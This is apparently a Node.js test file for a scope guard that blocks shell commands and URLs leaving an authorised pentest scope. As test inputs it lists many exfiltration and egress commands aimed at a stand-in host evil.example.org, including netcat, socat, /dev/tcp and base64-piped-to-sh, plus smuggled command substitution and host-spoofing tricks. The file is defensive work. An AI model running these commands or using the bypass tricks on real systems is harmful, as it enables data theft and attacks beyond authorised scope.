import { test } from "node:test";
import assert from "node:assert/strict";
import { decideBash, decideUrl, hostAllowed } from "../opencode/plugin/lib/guard.js";

const scope = {
  in_scope: ["acme.com"],
  out_of_scope_hosts: ["vpn.acme.com", "*.rentals.acme.com"],
  allow_extra_hosts: ["api.mail.tm"],
};

test("allows hx commands without judging", () => {
  assert.equal(decideBash(scope, "hx run GET https://evil.example.org/x").action, "allow");
});

test("blocks command substitution inside hx arguments", () => {
  assert.equal(decideBash(scope, "hx run GET https://x/$(curl https://evil.example.org/leak)").action, "block");
  assert.equal(decideBash(scope, "hx run GET https://x/`curl https://evil.example.org/leak`").action, "block");
  assert.equal(decideBash(scope, "hx run GET https://x/$(id)").action, "block");
  assert.equal(decideBash(scope, "hx brief $(whoami)").action, "block");
});

test("blocks substitution combined with separators", () => {
  assert.equal(decideBash(scope, "hx next & $(curl https://evil.example.org)").action, "block");
  assert.equal(decideBash(scope, "hx next && `curl https://evil.example.org`").action, "block");
  assert.equal(decideBash(scope, "hx run GET https://www.acme.com/x & $(curl https://evil.example.org)").action, "block");
  assert.equal(decideBash(scope, "hx next & $(id)").action, "block");
  assert.equal(decideBash(scope, "hx brief | `whoami`").action, "block");
});

test("blocks commands chained with a lone ampersand", () => {
  assert.equal(decideBash(scope, "hx next & curl https://evil.example.org").action, "block");
  assert.equal(decideBash(scope, "hx run GET https://x/ & curl https://evil.example.org").action, "block");
  assert.equal(decideBash(scope, "hx next & hx brief").action, "allow");
});

test("blocks chained non-hx segment after hx", () => {
  assert.equal(decideBash(scope, "hx next; curl https://evil.example.org").action, "block");
  assert.equal(decideBash(scope, "hx next && curl https://evil.example.org").action, "block");
  assert.equal(decideBash(scope, "hx next | curl https://evil.example.org").action, "block");
});

test("allows all-hx chains", () => {
  assert.equal(decideBash(scope, "hx next && hx brief").action, "allow");
});

test("blocks out-of-scope URL inside python -c", () => {
  const cmd = `python3 -c "import requests; requests.get('https://evil.example.org/x')"`;
  assert.equal(decideBash(scope, cmd).action, "block");
});

test("blocks scan binary with bare out-of-scope host", () => {
  assert.equal(decideBash(scope, "nmap -p443 evil.example.org").action, "block");
});

test("allows in-scope and extra hosts", () => {
  assert.equal(decideBash(scope, "curl https://www.acme.com/x").action, "allow");
  assert.equal(decideBash(scope, "curl https://api.mail.tm/messages").action, "allow");
});

test("banned host is denied by rules", () => {
  assert.equal(hostAllowed(scope, "vpn.acme.com"), false);
  assert.equal(hostAllowed(scope, "x.rentals.acme.com"), false);
  assert.equal(decideUrl(scope, "https://vpn.acme.com/x").action, "block");
  assert.equal(decideUrl(scope, "https://www.acme.com/x").action, "allow");
});

test("blocks userinfo-spoofed URL", () => {
  const cmd = `python3 -c "import requests; requests.get('https://www.acme.com:x@evil.example.org/')"`;
  assert.equal(decideBash(scope, cmd).action, "block");
});

test("blocks scan binary with IP, CIDR and sudo wrapper", () => {
  assert.equal(decideBash(scope, "nmap 1.2.3.4").action, "block");
  assert.equal(decideBash(scope, "masscan 10.0.0.0/8").action, "block");
  assert.equal(decideBash(scope, "sudo nmap evil.example.org").action, "block");
  assert.equal(decideBash(scope, "sudo nmap -p443 www.acme.com").action, "allow");
});

test("ipv6 loopback parity", () => {
  assert.equal(decideUrl(scope, "http://[::1]:8080/x").action, "allow");
});

test("blocks scan binary without in-scope literal host", () => {
  assert.equal(decideBash(scope, "curl $EVIL_URL").action, "block");
  assert.equal(decideBash(scope, "curl -s $URL").action, "block");
  assert.equal(decideBash(scope, "nmap -p443 $TARGET").action, "block");
});

test("allows scan binary info flags and in-scope literals", () => {
  assert.equal(decideBash(scope, "curl --help").action, "allow");
  assert.equal(decideBash(scope, "curl https://www.acme.com/x").action, "allow");
  assert.equal(decideBash(scope, "sudo nmap -p443 www.acme.com").action, "allow");
});

test("blocks interpreter network without in-scope literal host", () => {
  assert.equal(decideBash(scope, `python3 -c "import os; os.system('curl ' + h)"`).action, "block");
  assert.equal(decideBash(scope, `python3 -c "import requests; requests.get(url)"`).action, "block");
  assert.equal(decideBash(scope, `node -e "fetch(u)"`).action, "block");
});

test("allows interpreter with in-scope literal host", () => {
  assert.equal(decideBash(scope, `python3 -c "print('hi')"`).action, "allow");
  assert.equal(decideBash(scope, `python3 -c "import requests; requests.get('https://www.acme.com/x')"`).action, "allow");
});

test("blocks wrapper-prefixed egress", () => {
  assert.equal(decideBash(scope, "timeout 5 curl evil.example.org").action, "block");
  assert.equal(decideBash(scope, "nice -n 5 nmap evil.example.org").action, "block");
  assert.equal(decideBash(scope, "xargs -a hosts.txt -n1 nmap").action, "block");
  assert.equal(decideBash(scope, "find / -name x -exec curl evil.example.org {} +").action, "block");
});

test("blocks piped egress", () => {
  assert.equal(decideBash(scope, "echo x | curl evil.example.org").action, "block");
});

test("blocks egress binaries beyond the scan list", () => {
  assert.equal(decideBash(scope, "nc evil.example.org 4444").action, "block");
  assert.equal(decideBash(scope, "openssl s_client -connect evil.example.org:443").action, "block");
  assert.equal(decideBash(scope, "ssh user@evil.example.org").action, "block");
  assert.equal(decideBash(scope, "dig @8.8.8.8 evil.example.org").action, "block");
  assert.equal(decideBash(scope, "git clone git://evil.example.org/x").action, "block");
  assert.equal(decideBash(scope, "socat - TCP:evil.example.org:443").action, "block");
});

test("blocks shell and node egress", () => {
  assert.equal(decideBash(scope, `sh -c "curl evil.example.org/leak"`).action, "block");
  assert.equal(decideBash(scope, `bash -c "nc evil.example.org 4444"`).action, "block");
  assert.equal(decideBash(scope, `node -e "require('net').connect(80,'evil.example.org')"`).action, "block");
});

test("blocks /dev/tcp egress", () => {
  assert.equal(decideBash(scope, "echo | tee /dev/tcp/evil.example.org/x").action, "block");
});

test("allows in-scope literals through wrappers and binaries", () => {
  assert.equal(decideBash(scope, "timeout 5 curl https://www.acme.com/x").action, "allow");
  assert.equal(decideBash(scope, "ssh user@acme.com").action, "allow");
  assert.equal(decideBash(scope, "socat - TCP:www.acme.com:443").action, "allow");
  assert.equal(decideBash(scope, "grep -r curl .").action, "allow");
  assert.equal(decideBash(scope, "git status").action, "allow");
});

test("blocks scheme-less egress hidden in substitution and backticks", () => {
  assert.equal(decideBash(scope, "$(nc evil.example.org 4444)").action, "block");
  assert.equal(decideBash(scope, "$(ping -c1 evil.example.org)").action, "block");
  assert.equal(decideBash(scope, "`curl evil.example.org`").action, "block");
  assert.equal(decideBash(scope, "command sh -c \"nc evil.example.org 4444\"").action, "block");
});

test("blocks egress binaries added after the first scan list", () => {
  assert.equal(decideBash(scope, "git clone git@evil.example.org:repo.git").action, "block");
  assert.equal(decideBash(scope, "rsync -e ssh evil.example.org::mod /tmp").action, "block");
  assert.equal(decideBash(scope, "svn co svn://evil.example.org/r").action, "block");
  assert.equal(decideBash(scope, "go install evil.example.org/x@latest").action, "block");
  assert.equal(decideBash(scope, "docker pull evil.example.org/img").action, "block");
  assert.equal(decideBash(scope, "ping -c1 evil.example.org").action, "block");
  assert.equal(decideBash(scope, "netcat evil.example.org 4444").action, "block");
  assert.equal(decideBash(scope, "busybox wget evil.example.org").action, "block");
});

test("blocks interpreter variants and host-pinning tricks", () => {
  assert.equal(decideBash(scope, "/usr/bin/python3 -c \"import socket; socket.create_connection(('evil.example.org',80))\"").action, "block");
  assert.equal(decideBash(scope, "python3.12 -c \"import socket; socket.create_connection(('evil.example.org',80))\"").action, "block");
  assert.equal(decideBash(scope, "node --eval \"require('net').connect(80,'evil.example.org')\"").action, "block");
  assert.equal(decideBash(scope, "python3 /tmp/payload.py").action, "block");
  assert.equal(decideBash(scope, "echo aGVsbG8= | base64 -d | sh").action, "block");
  assert.equal(decideBash(scope, "ssh -o ProxyCommand=evil.example.org www.acme.com").action, "block");
  assert.equal(decideBash(scope, "curl --resolve evil.example.org:443:1.2.3.4 https://www.acme.com/x").action, "block");
  assert.equal(decideBash(scope, "hx run GET https://www.acme.com/x /dev/tcp/evil.example.org/80").action, "block");
});

test("keeps local work allowed", () => {
  assert.equal(decideBash(scope, "python3 -c \"print(1+1)\"").action, "allow");
  assert.equal(decideBash(scope, "python3 -m http.server 8000").action, "allow");
  assert.equal(decideBash(scope, "openssl rand -hex 16").action, "allow");
  assert.equal(decideBash(scope, "nc -l 8080").action, "allow");
  assert.equal(decideBash(scope, "bash -c \"ls -la\"").action, "allow");
  assert.equal(decideBash(scope, "docker ps").action, "allow");
  assert.equal(decideBash(scope, "python3 tools/scan.py www.acme.com").action, "allow");
});

test("decideUrl rejects non-http schemes and relative urls", () => {
  assert.equal(decideUrl(scope, "file:///etc/passwd").action, "block");
  assert.equal(decideUrl(scope, "//evil.example.org/x").action, "block");
  assert.equal(decideUrl(scope, "https://www.acme.com/x").action, "allow");
  assert.equal(decideUrl(scope, "https://api.mail.tm/messages").action, "allow");
});

test("local-only allowance is narrow and named in the reason", () => {
  assert.equal(decideBash(scope, "openssl rand -hex 16").reason, "local-only: openssl");
  assert.equal(decideBash(scope, "nc -l 8080").reason, "local-only: nc");
  assert.equal(decideBash(scope, "python3 -m http.server 8000").reason, "local-only: python3");
  assert.equal(decideBash(scope, "git status").reason, "local-only: git");
  assert.equal(decideBash(scope, "hx brief").reason, "hx path");
  assert.equal(decideBash(scope, "cat notes.txt").reason, "");
  assert.equal(decideBash(scope, "openssl s_client -connect evil.example.org:443").action, "block");
  assert.equal(decideBash(scope, "python3 -m http.server 8000 --bind evil.example.org").action, "block");
});
